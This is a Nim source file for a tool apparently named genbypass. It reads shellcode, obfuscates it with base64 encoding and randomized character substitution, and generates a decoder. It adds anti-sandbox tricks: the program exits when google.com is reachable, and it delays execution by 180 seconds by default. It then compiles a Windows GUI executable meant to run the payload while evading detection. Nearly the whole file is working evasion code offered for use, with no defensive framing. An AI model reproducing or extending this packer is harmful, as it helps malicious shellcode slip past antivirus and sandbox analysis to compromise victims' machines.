# 生成bypass

import base64
import strutils
import strformat
import random
import os

import argparse
import nigui

randomize()

app.init()

const used_enc_chars = ":;<>?[]^-_{}$&#"
const base64_table = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"

proc shuffleCount(s : string, l : int) : string =
  var r = s
  shuffle(r)
  r.substr(0, l)

proc gen_shell_exe(shellcode: string, sleep = 0, use_google = false) =
  echo fmt"shellcode len {len(shellcode)}"
  let
    replace_count = rand(3 .. len(used_enc_chars))
    to_chars = shuffleCount(used_enc_chars, replace_count)
    from_chars = shuffleCount(base64_table, replace_count)
  echo fmt"replace {replace_count} times."
  var
    enc_code : string = shellcode.encode()
    dec_code : string = ""
  for i in 0 ..< replace_count:
    let fromc = from_chars[i]
    let toc = to_chars[i]
    echo fmt"replace {fromc} to {toc}"
    dec_code.add fmt""".replace("{toc}", "{fromc}")"""
    enc_code = replace(enc_code, fromc, toc)
  echo fmt"use google: {use_google}"
  let check_google = if use_google: """
import net

proc checkEnv() =
  try:
    discard dial("google.com", Port(80))
    quit()
  except:
    discard
"""
                     else: """
proc checkEnv() =
  discard
"""
  let sleep_time = sleep * 1000
  echo "sleep:", sleep_time
  let result = fmt"""
# generated by genbypass
import base64
import strutils
{check_google}

proc codeDecode(s : string) : string =
  s{dec_code}.decode()

let wait_time = {sleep_time}

let codes = "{enc_code}"

"""
  echo "save bytes.nim"
  writeFile("bytes.nim", result)
  #test encode
  let test_encode = fmt"""
include bytes
let org_codes = {escape(shellcode)}

assert org_codes == codeDecode(codes)
echo "test shellcode decode ok!"
"""
  writeFile("bytes_test.nim", test_encode)
  echo "test shellcode decode..."
  discard execShellCmd("nim c -r bytes_test.nim")
  echo "building bypass.exe:"
  const bypass_code =  slurp("../resources/bypass.nim")
  writeFile("bypass.nim", bypass_code)
  discard execShellCmd("nim c -d:mingw --cpu:amd64 -d:danger --app:gui bypass.nim")
  echo "ok."

if isMainModule:
  var
    p = newParser("genbypass"):
      help("generate bypass code")
      option("-f", "--file", help="input shell code file, hex string format")
      flag("-c", "--clipboard", help="get shell code from clipboard")
      flag("-g", "--google", help="if host can connect google, then quit.")
      option("-s", "--sleep", help="sleep x seconds then start shellcode.", default="180")
    opts = p.parse(commandLineParams())
    input_code = if opts.clipboard:
                   app.clipboardText()
                 elif opts.file != "":
                   readFile(opts.file)
                 elif opts.help:
                   quit()
                 else:
                   echo "Enter shell code hex:"
                   readLine(stdin)
    org_code = input_code.strip().unescape(prefix="", suffix="")

  gen_shell_exe(org_code,
                use_google = opts.google,
                sleep = parseInt(opts.sleep))

